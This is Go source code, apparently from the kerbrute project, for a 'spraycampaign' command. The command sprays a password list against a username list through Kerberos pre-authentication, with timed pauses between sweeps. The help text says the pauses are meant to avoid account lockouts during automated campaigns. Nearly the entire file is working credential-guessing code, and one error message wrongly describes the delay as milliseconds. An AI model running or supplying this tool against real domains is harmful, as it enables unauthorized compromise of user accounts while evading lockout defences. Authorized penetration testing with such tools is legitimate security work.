package cmd

import (
	"bufio"
	"os"
	"sync"
	"sync/atomic"
	"time"
    "strconv"
    "fmt"

	"github.com/ropnop/kerbrute/util"

	"github.com/spf13/cobra"
)

var sprayCampaignCmd = &cobra.Command{
	Use:   "spraycampaign [flags] <username_wordlist> <password_wordlist> <time in MINUTES between sweeps> <number of passwords per sweep>",
	Short: "Tests X passwords from a provided list of passwords every X minute(s) against a list of usernames",
	Long: `Will perform a password spray attack against a list of users, iterating through a list of passwords. This is much like the passwordspray
    command, however it allows for a specified delay between every X number of passwords per sweep time. 
    This is Intended to allow for automated password spraying campaigns to take place without fear of locking out accounts while alleviating the need
    to keep restarting the spray with a new password.
    Like passwordspray, this is using Kerberos Pre-Authentication by requesting a TGT from the KDC.
    If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
    A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
    Succesful logins will be displayed on stdout.
    Consider adding an additional minute or more to the domain password policy to prevent lockouts.
    WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args:   cobra.MinimumNArgs(4),
	PreRun: setupSession,
	Run:    sprayCampaign,
}

func init() {
	sprayCampaignCmd.Flags().BoolVar(&userAsPass, "user-as-pass", false, "Spray every account with the username as the password")
	rootCmd.AddCommand(sprayCampaignCmd)

}

func sprayCampaign(cmd *cobra.Command, args []string) {
    if len(args) != 4 {
        logger.Log.Error("You must specify a passfile containing passwords as well as the time between sweeps in millis and then the number of passwords per sweep")
        os.Exit(1)
    }
	usernamelist  := args[0]
    passwordfile  := args[1]
	campaigndelay := args[2]
	maxpersweep   := args[3]

    maxPerSweep,err := strconv.Atoi(maxpersweep)
    if err!=nil {
        logger.Log.Error(err.Error())
        return
    }

    campaignDelay,err := strconv.Atoi(campaigndelay)
    if err!=nil {
        logger.Log.Error(err.Error())
        return
    }

	stopOnSuccess = false

	credChan :=  make(chan [2]string, threads)
	defer cancel()

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if usernamelist != "-" {
		file, err := os.Open(usernamelist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < threads; i++ {
		go makeSprayWorkerCampaign(ctx, credChan, &wg, userAsPass)
	}

	start := time.Now()

    // read passwords 
    var passwords []string
    var password_scanner *bufio.Scanner
    passfile, err := os.Open(passwordfile)

    if err != nil {
        logger.Log.Error(err.Error())
        return
    }
    defer passfile.Close()

    password_scanner = bufio.NewScanner(passfile)

    for password_scanner.Scan() {
        passwordline := password_scanner.Text()
        passwords=append(passwords,passwordline)
    }

    // read the usernames
    var usernames []string
	for scanner.Scan() {
        usernameline := scanner.Text()
        username, err := util.FormatUsername(usernameline)
        if err != nil {
            logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
            continue
        }
        usernames=append(usernames,username)
	}

    triedThisSweep := 0
    for _,password := range passwords {
        logger.Log.Info(fmt.Sprintf("Spraying password: %s",password))
        for _,username := range usernames {
            cred := [2]string{username,password}
            credChan <- cred
            time.Sleep(time.Duration(delay) * time.Millisecond)
        }
        triedThisSweep++
        if triedThisSweep >= maxPerSweep {
            triedThisSweep = 0
            logger.Log.Info(fmt.Sprintf("Sleeping for %d minutes until next sweep\n",campaignDelay))
            time.Sleep(time.Duration(campaignDelay) * (time.Millisecond * 1000 * 60))
        }
    }

	close(credChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}
}
